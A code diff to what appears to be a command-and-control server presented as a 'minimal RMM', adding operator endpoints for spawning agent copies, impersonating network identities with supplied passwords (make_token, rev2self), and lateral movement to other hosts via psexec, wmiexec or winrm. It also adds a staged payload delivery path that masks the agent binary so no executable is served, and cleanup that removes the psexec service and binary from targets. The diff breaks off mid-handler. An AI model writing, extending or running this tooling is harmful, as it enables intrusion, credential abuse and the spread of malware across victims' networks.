@@ -26,6 +26,7 @@ import argparse
 import hashlib
 import re
 import secrets
+import struct
 import signal
 import socket
 import threading
@@ -113,6 +114,68 @@ PLUGIN_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$")
 PLUGIN_ARTIFACT_EXTENSIONS = {".dll", ".ps1"}
 PLUGIN_EXPORT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")
 PLUGIN_COMMAND_RE = re.compile(r"^[A-Za-z][A-Za-z0-9._-]{0,127}$")
+# Agent-side spawn handshake: the Go agent answers __SPAWN__ with
+# "spawned session=<id> pid=<pid>" as soon as the detached child is created.
+SPAWN_COMMAND = "__SPAWN__"
+SPAWN_RESULT_RE = re.compile(r"session=(?P<session_id>[A-Za-z0-9_-]{8,128})\s+pid=(?P<pid>\d+)")
+# Network identity commands. The agent answers __MAKE_TOKEN__ with a
+# "token created:" / "token replaced:" prefix on success; the password is
+# never recorded in operator events, only the identity label is.
+MAKE_TOKEN_COMMAND = "__MAKE_TOKEN__"
+REV2SELF_COMMAND = "__REV2SELF__"
+MAKE_TOKEN_OK_PREFIXES = ("token created:", "token replaced:")
+# Lateral movement: the Go agent answers __LATERAL__ with
+# "lateral started: method=… host=… target session=<id>" once the target copy
+# is running. __UID__ reports the process and network identities.
+LATERAL_COMMAND = "__LATERAL__"
+UID_COMMAND = "__UID__"
+LATERAL_METHODS = frozenset({"psexec", "wmiexec", "winrm"})
+LATERAL_RESULT_RE = re.compile(r"target session=(?P<session_id>[A-Za-z0-9_-]{8,128})")
+# The psexec handshake also carries the deployment names the cleanup
+# command must remove on the target.
+LATERAL_SERVICE_RE = re.compile(r"service=(?P<service_name>[A-Za-z0-9][A-Za-z0-9._-]{0,127})")
+LATERAL_BINARY_RE = re.compile(r"binary=(?P<binary_name>[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.exe)")
+LATERAL_CLEANUP_COMMAND = "__LATERAL_CLEANUP__"
+STAGING_TTL_SECONDS = 600
+STAGING_ID_RE = re.compile(r"^[A-Za-z0-9_-]{8,128}$")
+
+
+def staging_mask(payload: bytes, staging_id: str) -> bytes:
+    """Mask a staged payload with a SHA-256 counter keystream keyed by the
+    staging identifier, so the listener never serves an executable file."""
+    seed = staging_id.encode("utf-8")
+    digest_size = hashlib.sha256().digest_size
+    masked = bytearray(payload)
+    for offset in range(0, len(masked), digest_size):
+        block = hashlib.sha256(seed + struct.pack(">Q", offset // digest_size)).digest()
+        for index in range(min(digest_size, len(masked) - offset)):
+            masked[offset + index] ^= block[index]
+    return bytes(masked)
+
+
+def latest_go_agent_binary() -> str | None:
+    """Newest raw Windows amd64 agent binary produced by build_go_agent."""
+    if not os.path.isdir(GO_AGENT_BUILD_DIR):
+        return None
+    best, best_mtime = None, -1.0
+    suffix = "minimal-rmm-agent-windows-amd64.exe"
+    try:
+        names = os.listdir(GO_AGENT_BUILD_DIR)
+    except OSError:
+        return None
+    for name in names:
+        if not name.endswith(suffix):
+            continue
+        path = os.path.join(GO_AGENT_BUILD_DIR, name)
+        try:
+            if not os.path.isfile(path):
+                continue
+            mtime = os.path.getmtime(path)
+        except OSError:
+            continue
+        if mtime > best_mtime:
+            best, best_mtime = path, mtime
+    return best
 TUN_HELPER = settings_getenv("RMM_TUN_HELPER", "").strip() or os.path.join(SERVER_TOOLS_DIR, "rmm-tun")
 SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
 HISTORY_DIR = os.path.join(LOG_DIR, "history")
@@ -354,8 +417,6 @@ def plugin_command_metadata(command: str, agent_type: str | None = None) -> dict
 GO_AGENT_TARGETS = {
     ("windows", "amd64"),
     ("windows", "arm64"),
-    ("linux", "amd64"),
-    ("linux", "arm64"),
 }
 
 
@@ -459,6 +520,23 @@ def validate_agent_connection(agent_config, public_url):
         raise ValueError("The selected Quick Tunnel URL is stale. Refresh transport status and use the current beacon URL before building.")
 
 
+def deployment_workspace_id(server, requested="", scope=None):
+    """Choose an artifact owner from authenticated scope or a configured ID."""
+    requested = str(requested or "").strip()
+    registry = getattr(server, "workspace_registry", None)
+    owners = registry.ids() if registry else []
+    if scope and requested and requested != scope:
+        raise ValueError("workspace scope mismatch")
+    owner = scope or requested
+    if not owner and len(owners) == 1:
+        owner = owners[0]
+    if owner and (not valid_workspace_id(owner) or owner not in owners):
+        raise ValueError("unknown or invalid workspace id")
+    if not owner and len(owners) > 1:
+        raise ValueError("workspace_id is required for an administrator build with multiple workspaces")
+    return owner or ""
+
+
 def render_configured_client_script(
     template: str,
     base_url: str,
@@ -467,6 +545,7 @@ def render_configured_client_script(
     sleep_seconds: int = 60,
     jitter_percent: int = 30,
     http_proxy: str = "",
+    workspace_id: str = "",
 ) -> str:
     """Render a ready-to-run client_rmm.ps1 with an explicit connection config."""
     url = str(base_url or "").strip().rstrip("/")
@@ -484,10 +563,14 @@ def render_configured_client_script(
     def ps_quote(value: str) -> str:
         return "'" + value.replace("'", "''") + "'"
 
+    if workspace_id and not valid_workspace_id(workspace_id):
+        raise ValueError("invalid workspace id")
     replacements = {
         "$u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'\n": "$u = " + ps_quote(url) + "\n",
         "$beaconSecret = ''\n": "$beaconSecret = " + ps_quote(secret) + "\n",
     }
+    if workspace_id:
+        replacements["$workspaceId = ''\n"] = "$workspaceId = " + ps_quote(workspace_id) + "\n"
     if session_id:
         if not validate_beacon_session_id(session_id):
             raise ValueError("invalid session id")
@@ -521,13 +604,15 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
         raise RuntimeError("Go toolchain is not installed on the RMM server")
     agent_config = agent_config if isinstance(agent_config, dict) else {}
     config_values = {}
-    for key in ("base_url", "beacon_secret", "session_id", "http_proxy"):
+    for key in ("base_url", "beacon_secret", "session_id", "http_proxy", "workspace_id"):
         value = str(agent_config.get(key) or "").strip()
         if "\r" in value or "\n" in value:
             raise ValueError(f"invalid {key}")
         config_values[key] = value[:4096]
     if config_values["session_id"] and not validate_beacon_session_id(config_values["session_id"]):
         raise ValueError("invalid session id")
+    if config_values["workspace_id"] and not valid_workspace_id(config_values["workspace_id"]):
+        raise ValueError("invalid workspace id")
     try:
         sleep_seconds = int(agent_config.get("sleep_seconds", 60))
         jitter_percent = int(agent_config.get("jitter_percent", 30))
@@ -553,10 +638,49 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
             "GOCACHE": go_cache,
         }
     )
+    # The psexec lateral module embeds the compact stage1 launcher in the
+    # agent binary (go:embed stage1.bin): build it first for Windows targets
+    # so the agent can extract and push it at runtime.
+    if goos == "windows":
+        stage1_flags = ["-s", "-w", "-H=windowsgui"]
+        if config_values["base_url"]:
+            stage1_flags.extend([
+                "-X",
+                "main.defaultBaseURLB64=" + base64.b64encode(config_values["base_url"].encode("utf-8")).decode("ascii"),
+            ])
+        stage1_ldflags = " ".join(shlex.quote(flag) for flag in stage1_flags)
+        stage1_path = safe_join_under(GO_AGENT_BUILD_DIR, f"{build_id}-stage1.exe")
+        try:
+            completed_stage1 = (process_owner or BuildProcessManager()).run(
+                [
+                    go_bin,
+                    "build",
+                    "-buildvcs=false",
+                    "-trimpath",
+                    "-ldflags",
+                    stage1_ldflags,
+                    "-o",
+                    stage1_path,
+                    "./stage1",
+                ],
+                cwd=root,
+                env=env,
+                timeout=120,
+            )
+        except subprocess.TimeoutExpired as exc:
+            raise RuntimeError("stage1 build timed out after 120 seconds") from exc
+        if completed_stage1.returncode != 0:
+            detail = (completed_stage1.stderr or completed_stage1.stdout or "build failed").strip()
+            raise RuntimeError(detail[-4000:])
+        with open(stage1_path, "rb") as handle:
+            stage1_binary = handle.read()
+        with open(os.path.join(root, "stage1.bin"), "wb") as handle:
+            handle.write(stage1_binary)
     linker_values = {
         "defaultBaseURLB64": config_values["base_url"],
         "defaultBeaconSecretB64": config_values["beacon_secret"],
         "defaultSessionIDB64": config_values["session_id"],
+        "defaultWorkspaceIDB64": config_values["workspace_id"],
         "defaultHTTPProxyB64": config_values["http_proxy"],
         "defaultSleepSecondsB64": str(sleep_seconds),
         "defaultJitterPercentB64": str(jitter_percent),
@@ -595,6 +719,7 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
         "RMM_BASE_URL": config_values["base_url"],
         "RMM_BEACON_SECRET": config_values["beacon_secret"],
         "RMM_SESSION_ID": config_values["session_id"],
+        "RMM_AGENT_WORKSPACE_ID": config_values["workspace_id"],
         "RMM_SLEEP_SECONDS": str(sleep_seconds),
         "RMM_JITTER_PERCENT": str(jitter_percent),
         "RMM_HTTP_PROXY": config_values["http_proxy"],
@@ -653,9 +778,9 @@ minimal-rmm-agent.log.
 Windows PowerShell:
   .\\run-agent.ps1
 
-Linux/macOS shell:
-  chmod +x run-agent.sh
-  ./run-agent.sh
+Supported agent targets: Windows only. Non-Windows source adapters are for
+host-side development tests, not supported deployment targets.
+Workspace binding: RMM_AGENT_WORKSPACE_ID (embedded in configured builds).
 
 Authorized lab use only.
 """
@@ -670,6 +795,7 @@ Authorized lab use only.
     return {
         "filename": filename,
         "binary_filename": binary_filename,
+        "workspace_id": config_values["workspace_id"] or None,
         "goos": goos,
         "goarch": goarch,
         "sha256": digest.hexdigest(),
@@ -1001,6 +1127,8 @@ class RMMServer:
         self._shutdown_lock = threading.RLock()
         self._closed = False
         self.builds = BuildProcessManager()
+        self.staging_lock = threading.Lock()
+        self.staging_entries: dict[str, dict] = {}
         self._ai_jobs = None
         self.event_hub = OperatorEventHub()
         self.socks = SocksManager(log_fn=self.log)
@@ -2704,6 +2832,284 @@ class RMMServer:
             session.wait_result = None
         return result, "ok"
 
+    def _await_session_registration(self, session_id: str, timeout: float) -> bool:
+        """Wait until a spawned session completes its first beacon registration."""
+        deadline = time.monotonic() + max(0.0, float(timeout))
+        while True:
+            if self.get_session(session_id):
+                return True
+            remaining = deadline - time.monotonic()
+            if remaining <= 0:
+                return False
+            time.sleep(min(1.0, remaining))
+
+    def _new_deployment_id(self, kind):
+        """Reserve a fresh identity before dispatch so registration is authoritative."""
+        while True:
+            session_id = f"srv-{kind}-{secrets.token_hex(16)}"
+            if session_id not in getattr(self, "sessions", {}) and session_id not in getattr(self, "killed_sessions", set()):
+                return session_id
+
+    def _probe_deployment_session(self, session_id, timeout):
+        """Require the exact fresh probe response, not merely any output event."""
+        marker = "rmm-verify-" + secrets.token_hex(16)
+        command = "echo " + marker
+        session = self.get_session(session_id)
+        if session:
+            self.record_operator_action(session, command, "exec")
+        event, status = self.exec_and_wait(session_id, command, timeout=timeout)
+        output = str((event or {}).get("body") or "").strip()
+        responsive = status == "ok" and output == marker
+        return responsive, {"status": status if status != "ok" or responsive else "unexpected_output",
+                            "output": output, "command": command}
+
+    def _verify_deployment(self, source, target_id, payload, verify, register_timeout, verify_timeout, source_key, target_key):
+        """Prove fresh registration under the source owner before reporting success."""
+        payload.update({"ok": False, "accepted": True, "verify": bool(verify),
+                        "registered": None, "verified": None,
+                        source_key: None, target_key: None})
+        if not verify:
+            payload["pending"] = True
+            return payload, "ok"
+        registered = self._await_session_registration(target_id, register_timeout)
+        target = self.get_session(target_id) if registered else None
+        owner = getattr(source, "workspace_id", None)
+        registered = bool(target and target.id == target_id
+                          and getattr(target, "workspace_id", None) == owner)
+        payload["registered"] = registered
+        payload["workspace_id"] = owner
+        payload["registered_hostname"] = getattr(target, "hostname", None) if registered else None
+        payload["ok"] = registered
+        payload[source_key], payload["source_verify"] = self._probe_deployment_session(source.id, verify_timeout)
+        if registered:
+            payload[target_key], payload["target_verify"] = self._probe_deployment_session(target_id, verify_timeout)
+        payload["verified"] = bool(registered and payload[source_key] and payload[target_key])
+        return payload, "ok"
+
+    def spawn_session(self, session_id_or_prefix, verify=True, spawn_timeout=120.0,
+                      register_timeout=60.0, verify_timeout=120.0):
+        """Request a detached Go agent and prove its expected registration."""
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        spawned_id = self._new_deployment_id("spawn")
+        command = SPAWN_COMMAND + "\n" + json.dumps({
+            "session_id": spawned_id, "workspace_id": getattr(session, "workspace_id", None) or ""}, separators=(",", ":"))
+        self.record_operator_action(session, SPAWN_COMMAND, "spawn")
+        event, status = self.exec_and_wait(session.id, command, timeout=spawn_timeout)
+        if status not in ("ok", "timeout"):
+            return None, status
+        output = str((event or {}).get("body") or "")
+        match = SPAWN_RESULT_RE.search(output)
+        acknowledged = bool(match and match.group("session_id") == spawned_id)
+        payload = {"parent_session_id": session.id, "spawned_session_id": spawned_id,
+                   "spawn_pid": int(match.group("pid")) if acknowledged else None,
+                   "spawn_output": output, "launch_status": "acknowledged" if acknowledged else "inconclusive",
+                   "submission_status": status}
+        return self._verify_deployment(session, spawned_id, payload, verify, register_timeout,
+                                       verify_timeout, "parent_responsive", "spawned_responsive")
+
+    @staticmethod
+    def _identity_label(domain: str, user: str) -> str:
+        """Build the DOMAIN\\user label recorded in operator events."""
+        if domain:
+            return f"{domain}\\{user}"
+        return user
+
+    def make_token(
+        self,
+        session_id_or_prefix,
+        domain,
+        user,
+        password,
+        timeout=120.0,
+    ):
+        """Create a runas /netonly style network identity on a live Go session.
+
+        The password travels to the agent inside the beacon command, which
+        lives only in the in-memory command queue. Operator events and
+        history record the identity label, never the credentials.
+        """
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        user = (user or "").strip()
+        domain = (domain or "").strip()
+        if domain == "" and "\\" in user:
+            domain, user = (part.strip() for part in user.split("\\", 1))
+        if not user:
+            return None, "invalid_credentials"
+        identity = self._identity_label(domain, user)
+        command = MAKE_TOKEN_COMMAND + "\n" + json.dumps(
+            {"domain": domain, "user": user, "password": password or ""},
+            separators=(",", ":"),
+        )
+        self.record_operator_action(session, f"{MAKE_TOKEN_COMMAND} {identity}", "make_token")
+        event, status = self.exec_and_wait(session.id, command, timeout=timeout)
+        if status != "ok":
+            return None, status
+        body = str((event or {}).get("body") or "").strip()
+        return {
+            "ok": body.startswith(MAKE_TOKEN_OK_PREFIXES),
+            "session_id": session.id,
+            "identity": identity,
+            "output": body,
+        }, "ok"
+
+    def rev2self(self, session_id_or_prefix, timeout=120.0):
+        """Revert a Go session's spawned commands to the agent identity."""
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        self.record_operator_action(session, REV2SELF_COMMAND, "rev2self")
+        event, status = self.exec_and_wait(session.id, REV2SELF_COMMAND, timeout=timeout)
+        if status != "ok":
+            return None, status
+        body = str((event or {}).get("body") or "").strip()
+        return {"ok": body == "no token active" or body.startswith("token reverted:"),
+                "session_id": session.id, "output": body}, "ok"
+
+    def lateral_move(self, session_id_or_prefix, method, host, verify=True,
+                     exec_timeout=300.0, register_timeout=60.0, verify_timeout=120.0):
+        """Request remote execution; only the expected new agent proves deployment."""
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        method = (method or "").strip().lower()
+        host = (host or "").strip().strip("\\")
+        if method not in LATERAL_METHODS:
+            return None, "invalid_method"
+        if not host:
+            return None, "invalid_host"
+        target_id = self._new_deployment_id("lateral")
+        stage_id = ""
+        if method == "psexec":
+            # The listener stages the current agent build; stage1 fetches it
+            # with the staging reference as its only capability.
+            agent_binary = latest_go_agent_binary()
+            if not agent_binary:
+                return None, "agent_payload_unavailable"
+            try:
+                with open(agent_binary, "rb") as handle:
+                    stage_id = self.create_staging(handle.read())
+            except OSError as exc:
+                self.log(f"Staging the agent payload failed: {exc}", "WARNING")
+                return None, "agent_payload_unavailable"
+        command = LATERAL_COMMAND + "\n" + json.dumps({
+            "method": method, "host": host, "timeout_seconds": float(exec_timeout),
+            "session_id": target_id, "workspace_id": getattr(session, "workspace_id", None) or "",
+            "stage": stage_id}, separators=(",", ":"))
+        self.record_operator_action(session, f"{LATERAL_COMMAND} {method} {host}", "lateral")
+        event, status = self.exec_and_wait(session.id, command, timeout=exec_timeout)
+        if status not in ("ok", "timeout"):
+            return None, status
+        output = str((event or {}).get("body") or "").strip()
+        match = LATERAL_RESULT_RE.search(output)
+        acknowledged = bool(output.startswith("lateral started:") and match and match.group("session_id") == target_id)
+        service_match = LATERAL_SERVICE_RE.search(output)
+        binary_match = LATERAL_BINARY_RE.search(output)
+        payload = {"session_id": session.id, "method": method, "host": host,
+                   "target_session_id": target_id, "output": output,
+                   "launch_status": "acknowledged" if acknowledged else "inconclusive", "submission_status": status}
+        payload, verify_status = self._verify_deployment(session, target_id, payload, verify, register_timeout,
+                                                          verify_timeout, "source_responsive", "target_responsive")
+        if method == "psexec":
+            payload["stage_status"] = self.staging_status(stage_id) if stage_id else None
+            payload["cleanup"] = self._lateral_cleanup(
+                session, payload, host,
+                service_match.group("service_name") if service_match else "",
+                binary_match.group("binary_name") if binary_match else "")
+        return payload, verify_status
+
+    def _lateral_cleanup(self, session, payload, host, service_name, binary_name):
+        """Remove the psexec stage1 service and binary once the agent runs."""
+        if not payload.get("verify"):
+            return {"status": "skipped", "detail": "verification disabled"}
+        if not payload.get("registered"):
+            return {"status": "skipped", "detail": "target session never registered"}
+        if not (service_name and binary_name):
+            return {"status": "skipped", "detail": "deployment names not acknowledged"}
+        command = LATERAL_CLEANUP_COMMAND + "\n" + json.dumps(
+            {"host": host, "service_name": service_name, "binary_name": binary_name},
+            separators=(",", ":"))
+        self.record_operator_action(session, f"{LATERAL_CLEANUP_COMMAND} {host}", "lateral_cleanup")
+        event, status = self.exec_and_wait(session.id, command, timeout=150)
+        if status != "ok":
+            return {"status": status, "detail": None}
+        output = str((event or {}).get("body") or "").strip()
+        return {"status": "ok" if output.startswith("lateral cleanup: ") else "failed",
+                "output": output}
+
+    def create_staging(self, payload: bytes) -> str:
+        """Register a masked stage2 payload; the id is the only capability."""
+        staging_id = secrets.token_hex(16)
+        now = time.time()
+        with self.staging_lock:
+            self._purge_staging_locked(now)
+            self.staging_entries[staging_id] = {
+                "payload": payload,
+                "created": now,
+                "expires": now + STAGING_TTL_SECONDS,
+                "fetched": False,
+                "status": None,
+            }
+        return staging_id
+
+    def staging_payload(self, staging_id: str) -> bytes | None:
+        """Single-use masked fetch; consumed entries stay for status only."""
+        if not STAGING_ID_RE.match(staging_id or ""):
+            return None
+        with self.staging_lock:
+            entry = self.staging_entries.get(staging_id)
+            if not entry or entry["fetched"] or time.time() > entry["expires"]:
+                return None
+            entry["fetched"] = True
+            return entry["payload"]
+
+    def staging_record_status(self, staging_id: str, message: str) -> bool:
+        if not STAGING_ID_RE.match(staging_id or ""):
+            return False
+        with self.staging_lock:
+            entry = self.staging_entries.get(staging_id)
+            if not entry or time.time() > entry["expires"]:
+                return False
+            entry["status"] = str(message)[:2000]
+            return True
+
+    def staging_status(self, staging_id: str) -> str | None:
+        if not STAGING_ID_RE.match(staging_id or ""):
+            return None
+        with self.staging_lock:
+            entry = self.staging_entries.get(staging_id)
+            return entry["status"] if entry else None
+
+    def _purge_staging_locked(self, now: float) -> None:
+        for staging_id in [sid for sid, entry in self.staging_entries.items()
+                           if entry["expires"] < now]:
+            del self.staging_entries[staging_id]
+
+    def session_uid(self, session_id_or_prefix, timeout=120.0):
+        """Report the identity a Go agent runs under, plus any make_token identity."""
+        session = self.resolve_session(session_id_or_prefix)
+        if not session:
+            return None, "not_found"
+        if (getattr(session, "agent_type", "") or "").strip().lower() != "go":
+            return None, "agent_type_unsupported"
+        self.record_operator_action(session, UID_COMMAND, "uid")
+        event, status = self.exec_and_wait(session.id, UID_COMMAND, timeout=timeout)
+        if status != "ok":
+            return None, status
+        body = str((event or {}).get("body") or "").strip()
+        return {"ok": True, "session_id": session.id, "output": body}, "ok"
+
     def get_events(self, session_id_or_prefix, since_id=0, limit=50):
         session = self.resolve_session(session_id_or_prefix)
         if not session:
@@ -2731,12 +3137,21 @@ class RMMServer:
         sync_client_config=False,
         agent_type="powershell",
         capabilities=None,
+        workspace_id="",
     ):
+        workspace_id = str(workspace_id or "").strip()
+        if workspace_id and (not valid_workspace_id(workspace_id) or workspace_id not in self.workspace_registry.ids()):
+            raise ValueError("unknown or invalid agent workspace")
         to_save = None
         is_new = False
         with self.session_lock:
             if session_id in self.killed_sessions:
                 return None
+            live = self.sessions.get(session_id)
+            saved_owner = str(self._persisted_session_records.get(session_id, {}).get("workspace_id") or "").strip()
+            owner = getattr(live, "workspace_id", None) or saved_owner
+            if workspace_id and owner and workspace_id != owner:
+                raise ValueError("agent workspace does not match existing owner")
             persisted = self._persisted_session_configs.get(session_id)
             if not persisted:
                 persisted = self._persisted_config_from_history_meta(session_id)
@@ -2748,6 +3163,8 @@ class RMMServer:
                 persisted_workspace = str(persisted_record.get("workspace_id") or "").strip()
                 if valid_workspace_id(persisted_workspace):
                     session.workspace_id = persisted_workspace
+                elif workspace_id:
+                    session.workspace_id = workspace_id
                 elif self.storage_mode == "workspace":
                     owners = self.workspace_registry.ids()
                     if len(owners) == 1:
@@ -2767,6 +3184,9 @@ class RMMServer:
                 is_new = True
             else:
                 s = self.sessions[session_id]
+                binding_changed = bool(workspace_id and not s.workspace_id)
+                if binding_changed:
+                    s.workspace_id = workspace_id
                 s.last_seen = datetime.now()
                 s.hostname = hostname
                 s.username = username
@@ -2782,7 +3202,7 @@ class RMMServer:
                     s.config_synced = True
                     to_save = s
                 else:
-                    to_save = None
+                    to_save = s if binding_changed else None
         if is_new and to_save is not None:
             self.backfill_download_artifacts(to_save)
             self._apply_history_meta_to_session(to_save)
@@ -3220,10 +3640,13 @@ class RMMHandler(BaseHTTPRequestHandler):
             "/socks-ws",
             "/tun",
         } or path == "/tools/rclone.exe" or path.startswith("/tools/plugins/")
+        # Staging fetches are capability-authenticated by the unguessable
+        # staging identifier in the path; stage1 carries no beacon secret.
+        is_staging = path.startswith("/tools/stage/")
         if role == "admin":
             return is_api or is_web
         if role == "beacon":
-            return is_beacon
+            return is_beacon or is_staging
         return False
 
     def handle(self):
@@ -3493,6 +3916,47 @@ class RMMHandler(BaseHTTPRequestHandler):
     def _beacon_forbidden(self):
         self._respond(403, "FORBIDDEN")
 
+    def _serve_stage_tool(self, staging_id: str) -> bool:
+        """Serve one masked stage2 fetch or record one stage1 status line."""
+        server = self.server_instance
+        if self.command == "GET":
+            payload = server.staging_payload(staging_id)
+            if payload is None:
+                self._respond(404, "Staging entry not found, already fetched, or expired")
+                return True
+            masked = staging_mask(payload, staging_id)
+            self.send_response(200)
+            self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Disposition", 'attachment; filename="stage2.bin"')
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self._safe_write(masked)
+            return True
+        if self.command == "POST":
+            try:
+                length = int(self.headers.get("Content-Length") or 0)
+            except ValueError:
+                self._respond(400, "Invalid stage status body")
+                return True
+            if not 1 <= length <= 4096:
+                self._respond(413 if length > 4096 else 400, "Invalid stage status body length")
+                return True
+            try:
+                message = self.rfile.read(length).decode("utf-8", errors="replace").strip()
+            except (ValueError, OSError):
+                self._respond(400, "Invalid stage status body")
+                return True
+            if not message:
+                self._respond(400, "Empty stage status body")
+                return True
+            if not server.staging_record_status(staging_id, message):
+                self._respond(404, "Staging entry not found or expired")
+                return True
+            self._respond(200, "Recorded")
+            return True
+        self._respond(405, "Method not allowed")
+        return True
+
     def _serve_rclone_tool(self) -> bool:
         """Beacon-authenticated download of rclone.exe for agent bootstrap."""
         if not rclone_binary_available():
@@ -3708,6 +4172,18 @@ class RMMHandler(BaseHTTPRequestHandler):
             elif len(parts) == 3:
                 job = srv.ai_jobs().get(parts[2], owner=owner)
                 self._json(200 if job else 404, {"job": job} if job else {"error": "job_not_found"})
+            elif len(parts) == 5 and parts[3] == "evidence":
+                try:
+                    offset = int(qs.get("offset", ["0"])[0])
+                    limit = int(qs.get("limit", ["4096"])[0])
+                    if not 0 <= offset <= 2**31 - 1 or not 1 <= limit <= 4096:
+                        raise ValueError
+                except (ValueError, TypeError):
+                    self._json(400, {"error": "invalid_evidence_page"})
+                    return True
+                evidence = srv.ai_jobs().read_evidence(parts[2], owner, parts[4], offset, limit)
+                self._json(200 if evidence is not None else 404,
+                           {"evidence": evidence} if evidence is not None else {"error": "evidence_not_found"})
             else:
                 self._json(404, {"error": "not_found"})
             return True
@@ -3802,6 +4278,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     "sessions": count,
                     "storage_mode": srv.storage_mode,
                     "service_role": "control_plane",
+                    "workspace_id": workspace_id,
                     "operator_access": "workspace",
                     "admin_port": getattr(srv, "admin_port", ADMIN_PORT),
                     "beacon_port": getattr(srv, "beacon_port", BEACON_PORT),
@@ -4228,6 +4705,11 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if parts == ["agent", "deploy", "script"]:
+            try:
+                deployment_workspace = deployment_workspace_id(srv, body.get("workspace_id"), workspace_id)
+            except ValueError as exc:
+                self._json(400, {"error": "invalid_workspace", "detail": str(exc)})
+                return True
             public_url = str(srv.beacon_public_url or "").strip()
             if not public_url:
                 self._json(409, {"error": "no_active_beacon_url", "detail": "Start or configure a beacon transport profile first."})
@@ -4266,6 +4748,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     sleep_seconds=sleep_seconds,
                     jitter_percent=jitter_percent,
                     http_proxy=http_proxy,
+                    workspace_id=deployment_workspace,
                 )
             except ValueError as exc:
                 self._json(400, {"error": "invalid_agent_config", "detail": str(exc)})
@@ -4287,6 +4770,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 "sha256": digest.hexdigest(),
                 "base_url": public_url,
                 "session_id": session_id or None,
+                "workspace_id": deployment_workspace or None,
                 "download_url": f"{API_PREFIX}/artifacts/agent-deploy/{filename}",
                 "note": "Server-local artifact configured with the active beacon URL and secret; the secret is not returned.",
             })
@@ -4298,6 +4782,11 @@ class RMMHandler(BaseHTTPRequestHandler):
                 self._json(400, {"error": "invalid_agent_config", "detail": "config must be a JSON object"})
                 return True
             config = dict(config)
+            try:
+                config["workspace_id"] = deployment_workspace_id(srv, config.get("workspace_id"), workspace_id)
+            except ValueError as exc:
+                self._json(400, {"error": "invalid_workspace", "detail": str(exc)})
+                return True
             if body.get("use_server_config"):
                 if not str(config.get("base_url") or "").strip():
                     public_url = str(srv.beacon_public_url or "").strip()
@@ -4378,6 +4867,182 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return True
             self._json(200, {"ok": True, "session_id": session.id, "event": result,
                              "event_id_scope": "central"})
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "spawn":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            try:
+                verify = body.get("verify", True)
+                spawn_timeout = float(body.get("spawn_timeout", 120))
+                register_timeout = float(body.get("register_timeout", 60))
+                verify_timeout = float(body.get("verify_timeout", 120))
+                if not isinstance(verify, bool):
+                    raise ValueError("verify must be a boolean")
+                if not all(1 <= value <= 3600
+                           for value in (spawn_timeout, register_timeout, verify_timeout)):
+                    raise ValueError("spawn timeouts must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_spawn_options"})
+                return True
+            result, status = srv.spawn_session(
+                session.id,
+                verify=verify,
+                spawn_timeout=spawn_timeout,
+                register_timeout=register_timeout,
+                verify_timeout=verify_timeout,
+            )
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status, **(result or {})})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": SPAWN_COMMAND})
+            elif status == "spawn_result_invalid":
+                self._json(502, {"error": status, **(result or {})})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "make_token":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            try:
+                timeout = float(body.get("timeout", 120))
+                if not 1 <= timeout <= 3600:
+                    raise ValueError("timeout must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_make_token_options"})
+                return True
+            result, status = srv.make_token(
+                session.id,
+                str(body.get("domain") or ""),
+                str(body.get("user") or ""),
+                str(body.get("password") or ""),
+                timeout=timeout,
+            )
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status == "invalid_credentials":
+                self._json(400, {"error": status})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": MAKE_TOKEN_COMMAND})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "rev2self":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            try:
+                timeout = float(body.get("timeout", 120))
+                if not 1 <= timeout <= 3600:
+                    raise ValueError("timeout must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_rev2self_options"})
+                return True
+            result, status = srv.rev2self(session.id, timeout=timeout)
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
